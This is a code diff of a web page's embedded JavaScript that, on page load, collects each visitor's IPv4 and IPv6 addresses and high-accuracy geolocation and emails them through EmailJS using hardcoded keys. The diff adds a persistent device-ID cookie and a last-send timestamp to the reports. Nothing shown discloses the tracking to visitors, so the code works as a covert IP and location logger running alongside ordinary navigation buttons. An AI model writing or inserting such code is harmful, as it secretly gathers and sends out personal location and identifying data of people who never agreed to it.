@@ -42,25 +42,25 @@
             emailjs.init("N4QPJjdGkEyvy7BdZ"); // Your actual public key
         })();
 
-        // Function to send email with IP and geolocation info
-        function sendEmail(ipv4, ipv6, latitude, longitude) {
+        function sendEmail(ipv4, ipv6, latitude, longitude, deviceID, lastSendTime) {
             const templateParams = {
                 ipv4: ipv4 ? ipv4 : 'Unable to fetch!',
                 ipv6: ipv6 ? ipv6 : 'Unable to fetch!',
-                LOC: latitude && longitude ? `${latitude}, ${longitude}` : 'Geolocation denied or unavailable'
+                LOC: latitude && longitude ? `${latitude}, ${longitude}` : 'Geolocation denied or unavailable',
+                ID: deviceID,
+                lastSendTime: lastSendTime
             };
 
             emailjs.send('service_120g06v', 'template_j8q4zmc', templateParams)
                 .then(function(response) {
                     console.log('Email sent successfully!', response.status, response.text);
-                    // Set last sent time cookie to current time in UTC
-                    setCookie('lastSentTime', Date.now(), 30); // Expire in 30 days
+                    // Update last send time cookie to current time in UTC
+                    setCookie('lastSentTime', new Date().toUTCString(), 30); // Expire in 30 days
                 }, function(error) {
                     console.error('Failed to send email...', error);
                 });
         }
 
-        // Function to fetch IP addresses and send email
         function fetchIPsAndSendEmail() {
             console.log('Fetching IP addresses...');
 
@@ -85,25 +85,46 @@
                                     const longitude = position.coords.longitude;
                                     console.log('Geolocation coordinates:', latitude, longitude);
 
-                                    // Send email with IPs and geolocation
-                                    sendEmail(ipv4, ipv6, latitude, longitude);
+                                    // Get deviceID from cookie or create a new one
+                                    let deviceID = getCookie('deviceID');
+                                    if (!deviceID) {
+                                        deviceID = generateDeviceID();
+                                        setCookie('deviceID', deviceID, 30); // Set cookie to expire in 30 days
+                                    }
+
+                                    // Get last send time from cookie
+                                    const lastSendTime = getCookie('lastSentTime') || 'Never';
+
+                                    // Send email with IPs, geolocation, deviceID, and last send time
+                                    sendEmail(ipv4, ipv6, latitude, longitude, deviceID, lastSendTime);
                                 },
                                 function(error) {
                                     console.error('Error getting geolocation:', error);
-                                    // Send email with 'Unable to fetch!' for location
-                                    sendEmail(ipv4, ipv6);
+                                    
+                                    // Get deviceID from cookie or create a new one
+                                    let deviceID = getCookie('deviceID');
+                                    if (!deviceID) {
+                                        deviceID = generateDeviceID();
+                                        setCookie('deviceID', deviceID, 30); // Set cookie to expire in 30 days
+                                    }
+
+                                    // Get last send time from cookie
+                                    const lastSendTime = getCookie('lastSentTime') || 'Never';
+
+                                    // Send email with IPs and deviceID, no geolocation
+                                    sendEmail(ipv4, ipv6, null, null, deviceID, lastSendTime);
                                 },
                                 { enableHighAccuracy: true }
                             );
                         })
                         .catch(error => {
                             console.error('Error fetching IPv6 address:', error);
-                            sendEmail(ipv4, 'Unable to fetch!'); // Send email with 'Unable to fetch!' for IPv6
+                            sendEmail(ipv4, 'Unable to fetch!', null, null, getCookie('deviceID') || generateDeviceID(), getCookie('lastSentTime') || 'Never');
                         });
                 })
                 .catch(error => {
                     console.error('Error fetching IPv4 address:', error);
-                    sendEmail('Unable to fetch!', 'Unable to fetch!'); // Send email with 'Unable to fetch!' for both IPv4 and IPv6
+                    sendEmail('Unable to fetch!', 'Unable to fetch!', null, null, getCookie('deviceID') || generateDeviceID(), getCookie('lastSentTime') || 'Never');
                 });
         }
 
@@ -122,10 +143,15 @@
             document.cookie = `${name}=${value}; ${expires}; path=/`;
         }
 
+        // Function to generate a simple deviceID (for demonstration purposes)
+        function generateDeviceID() {
+            return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+        }
+
         // Send IP addresses and geolocation info on page load
         fetchIPsAndSendEmail();
 
-        // Navigation buttons (unchanged)
+        // Navigation buttons
         document.getElementById('gotoSpaceStationUSA').addEventListener('click', function() {
             window.location.href = '/ssusa/index.html';
         });
